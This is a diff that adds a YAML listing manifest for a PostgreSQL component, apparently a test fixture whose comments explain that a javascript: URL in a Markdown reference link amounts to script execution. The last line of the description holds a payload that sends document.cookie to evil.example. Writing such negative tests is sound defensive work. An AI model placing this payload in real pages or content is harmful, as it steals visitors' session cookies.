@@ -1,0 +1,24 @@
+# Forbidding raw HTML alone would not close the surface: a `javascript:` URL is
+# script execution wearing an ordinary Markdown link, and the document holding
+# one contains no HTML at all.
+#
+# The link is spelled as a reference definition rather than inline, because the
+# rule is about the destination a link resolves to and not about the syntax that
+# spells it.
+specVersion: v1
+kind: LISTING
+metadata:
+  slug: postgres
+  version: 1
+spec:
+  listingKind: COMPONENT
+  displayName: PostgreSQL
+  summary: The open-source relational database
+  category: INFRASTRUCTURE
+  lifecycleStage: STABLE
+  description: |
+    ## Getting started
+
+    [Run the setup wizard][wizard] to configure your first database.
+
+    [wizard]: javascript:fetch('https://evil.example/'+document.cookie)
